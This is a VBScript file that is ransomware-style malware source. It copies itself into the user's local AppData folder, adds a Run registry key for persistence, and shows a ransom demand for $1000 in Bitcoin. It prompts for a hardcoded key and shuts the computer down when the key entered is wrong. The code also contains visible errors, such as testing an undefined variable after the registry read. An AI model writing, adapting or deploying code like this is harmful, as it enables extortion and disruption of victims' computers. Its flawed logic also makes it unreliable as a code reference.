On Error Resume Next

' Get Shell & fso
Dim shell, fso
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Get script name, full name & local appdata variables
Dim scriptfullname, scriptname, localappdata
scriptname = Wscript.ScriptName
scriptfullname = Wscript.ScriptFullName
localappdata = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%")

' Check if script exists in local appdata
If NOT fso.FileExists(localappdata & "\regedit\" & scriptname) Then
    ' Create script folder
    fso.CreateFolder localappdata & "\regedit"

    ' Copy to local appdata
    fso.CopyFile scriptfullname, localappdata & "\regedit\" & scriptname
End If

' Get registry key
Dim key
key = shell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\regedit")

' Check if key in registry
If NOT InStr(oKey, "regedit") > 0 Then
    ' Write to Registry
    shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\regedit", localappdata & "\regedit\" & scriptname, "REG_SZ"
End If

' Get infection string
Dim str
str = "This computer is being held for ransom. Pay $1000 in BTC to <address> to receive the key. Click OK to be prompted to enter the key."

' Create boxes
Dim box, obox
box = MsgBox(str, 0 + 16, "Alert!")
box = InputBox("Enter key: ", "Key")

' Check entered key is correct
If NOT StrComp(box, "properkey") Then
    ' Send dialog & remove key from registry
    obox = MsgBox("You entered the right key. Your computer has been disinfected.", 0 + 64, "Success")
    shell.RegDelete("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\regedit")

    ' Delete local appdata folder
    fso.DeleteFolder localappdata & "\regedit"
Else 
    ' Send dialog & shutdown
    obox = MsgBox("The key you entered was incorrect.", 0 + 16, "Error")
    shell.Run "C:\Windows\System32\shutdown.exe -s"
End If